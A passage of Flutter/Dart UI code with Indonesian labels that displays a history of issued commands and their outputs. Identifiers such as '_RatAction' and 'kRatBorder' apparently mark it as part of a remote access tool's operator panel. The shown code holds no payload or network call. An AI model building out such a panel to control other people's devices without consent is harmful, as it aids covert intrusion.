                      fontFamily: 'Astral',
                    ),
                  ),
                ),
            ],
          ),
          const SizedBox(height: 12),
          if (_commandHistory.isEmpty)
            const Padding(
              padding: EdgeInsets.symmetric(vertical: 20),
              child: Center(
                child: Text(
                  'Belum ada command',
                  style: TextStyle(
                    color: Colors.white54,
                    fontFamily: 'Astral',
                    fontSize: 11,
                  ),
                ),
              ),
            )
          else
            Column(
              children: _commandHistory.take(20).map((item) {
                return Container(
                  margin: const EdgeInsets.only(bottom: 8),
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.3),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(
                        color: kRatBorder.withOpacity(0.2), width: 0.5),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          const Icon(Icons.chevron_right,
                              color: kRatBorder, size: 14),
                          Expanded(
                            child: Text(
                              item['command'] ?? '',
                              style: const TextStyle(
                                color: kRatBorder,
                                fontFamily: 'monospace',
                                fontSize: 11,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                          Text(
                            _formatTime(item['time']),
                            style: const TextStyle(
                              color: Colors.white38,
                              fontSize: 8,
                              fontFamily: 'monospace',
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 4),
                      Text(
                        item['output'] ?? '',
                        style: const TextStyle(
                          color: Colors.white70,
                          fontFamily: 'monospace',
                          fontSize: 10,
                          height: 1.4,
                        ),
                        maxLines: 5,
                        overflow: TextOverflow.ellipsis,
                      ),
                    ],
                  ),
                );
              }).toList(),
            ),
        ],
      ),
    );
  }

  String _formatTime(String? iso) {
    if (iso == null) return '';
    try {
      final dt = DateTime.parse(iso);
      return '${dt.hour.toString().padLeft(2, '0')}:${dt.minute.toString().padLeft(2, '0')}:${dt.second.toString().padLeft(2, '0')}';
    } catch (_) {
      return '';
    }
  }
}

// ─── HELPER CLASS ──────────────────────────────────────────────
class _RatAction {
  final IconData icon;
  final String label;
  final Color color;
  final VoidCallback onTap;

  _RatAction({
    required this.icon,
    required this.label,
    required this.color,
    required this.onTap,
  });
}